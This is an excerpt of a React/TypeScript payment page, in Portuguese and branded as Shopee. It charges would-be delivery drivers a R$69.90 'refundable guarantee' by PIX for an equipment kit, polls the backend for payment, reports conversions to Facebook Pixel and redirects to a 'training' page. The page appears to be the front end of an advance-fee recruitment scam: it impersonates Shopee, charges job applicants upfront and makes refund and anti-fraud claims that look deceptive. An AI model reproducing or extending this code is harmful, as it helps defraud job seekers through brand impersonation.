...
const Garantia: React.FC = () => {
  ...
  const fetchPaymentInfo = async (id: string) => {
    try {
      setIsLoading(true);
      console.log('[GARANTIA] Carregando informações de pagamento para ID:', id);
      
      // Usar o endpoint de transações com cache-busting
      const cacheBuster = Date.now();
      const url = `${API_BASE_URL}/api/transactions/${id}/status?t=${cacheBuster}`;
      console.log('[GARANTIA] Fazendo requisição para:', url);
      ...
      console.log('[GARANTIA] Resposta da API:', data);
      ...
      if (!data.transaction?.customer_name || !data.transaction?.customer_cpf) {
        ...
        if (candidatoData) {
          try {
            ...
            console.log('[GARANTIA] Dados encontrados no localStorage:', userData);
            ...
            console.error('[GARANTIA] Erro ao parsear dados do localStorage:', error);
          }
        }
      }
      ...
      console.log('[GARANTIA] Dados PIX extraídos:', {
      ...
      if (pixCode) {
        console.log('[GARANTIA] ✅ Código PIX recebido com sucesso!');
        setIsLoading(false);
      } else {
        console.log('[GARANTIA] ⏳ Aguardando código PIX... Continuará carregando.');
        // Manter loading ativo - será desligado quando o código chegar via polling
      }

      // 🚀 POLLING NO BACKEND - SEMPRE ATIVO!
      console.log('[GARANTIA] Iniciando polling no backend para transação:', id);
  ...
  const startBackendPolling = (transactionId: string) => {
    console.log(`[GARANTIA-POLL] Iniciando polling no backend para transação: ${transactionId}`);
    ...
    const checkPayment = async () => {
      try {
        ...
        console.log(`[GARANTIA-POLL] Verificando status: ${url}`);
        ...
        if (response.ok) {
          const data = await response.json();
          console.log(`[GARANTIA-POLL] Status recebido para ${transactionId}:`, data.status);
          ...
          if (newPixCode) {
            setPaymentInfo(prev => {
              ...
              console.log('[GARANTIA-POLL] ✅ Código PIX recebido via polling!');
          ...
          if (['PAID', 'APPROVED', 'COMPLETED', 'CONFIRMED', 'SUCCESS'].includes(statusUpper)) {
            console.log(`🎉 [GARANTIA-POLL] PAGAMENTO DA GARANTIA APROVADO! Redirecionando para /treinamento`);
            
            // Track conversion no Facebook Pixel
            if (typeof trackPurchase === 'function') {
              trackPurchase(transactionId, 69.90, 'BRL');
            }
            
            // Mostrar toast de sucesso
            toast({
              title: "✅ Pagamento da Garantia Confirmado!",
              description: "Redirecionando para o treinamento...",
              variant: "default",
            });
            
            // Redirecionamento IMEDIATO para treinamento
            setLocation('/treinamento');
            return; // Para o polling
          }
        } else {
          console.warn(`[GARANTIA-POLL] Erro HTTP ${response.status} ao verificar ${transactionId}`);
        }
        ...
        console.error(`[GARANTIA-POLL] Erro ao verificar ${transactionId}:`, error);
  ...
  useEffect(() => {
    if (paymentInfo) {
      ...
      console.log('[GARANTIA] Sistema de polling direto ativo.');
    }
      ...
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        ...
        <div className="flex items-center relative z-10">
          ...
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Pagamento da Garantia EPI</h1>
        ...
        <div className="w-full max-w-md mx-auto">
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22] text-center">Garantia - Kit EPI Shopee</h3>
              <div className="mt-3 bg-green-50 border border-green-200 rounded-md p-3">
                <div className="flex items-start gap-2">
                  ...
                  <p className="text-sm text-green-800">
                    <strong>Garantia Reembolsável:</strong> Este valor de R$69,90 será devolvido integralmente junto com o pagamento da sua primeira entrega como entregador Shopee.
                  </p>
                </div>
              </div>
            </div>
              ...
              {isLoading ? (
                ...
                <>
                  ...
                  <div className="text-center mb-6">
                    ...
                    <p className="text-gray-600 text-sm">Valor da Garantia - Kit EPI</p>
                    <div className="bg-green-50 border border-green-200 rounded-md px-3 py-2 mt-2 inline-block">
                      <p className="text-xs text-green-700">
                        ✅ <strong>Valor devolvido</strong> na sua primeira entrega
                      </p>
                    </div>
                  </div>
                  ...
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                    ...
                    <ol className="text-blue-700 text-sm space-y-1">
                      ...
                      <li>4. Confirme o pagamento de R$69,90</li>
                      <li>5. Você será redirecionado automaticamente para o treinamento</li>
                    </ol>
                  </div>
                  ...
                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-4">
                    ...
                    <p className="text-amber-700 text-sm mb-2">
                      Esta garantia de <strong>R$69,90</strong> é uma medida de segurança para evitar fraudes.
                    </p>
                    <p className="text-amber-700 text-sm">
                      Quando você concluir sua <strong>primeira entrega</strong> como entregador Shopee, o valor total será 
                      <strong> automaticamente devolvido</strong> junto com o pagamento da entrega.
                    </p>
                  </div>
                  ...
                  <div className="bg-gray-50 rounded-lg p-4">
                    <div className="flex items-center space-x-3">
                      ...
                      <div className="flex-1">
                        <h4 className="font-semibold text-gray-800">Kit EPI Shopee</h4>
                        <p className="text-sm text-gray-600">
                          Equipamentos de proteção individual completo
                        </p>
                      </div>
                    </div>
                  </div>
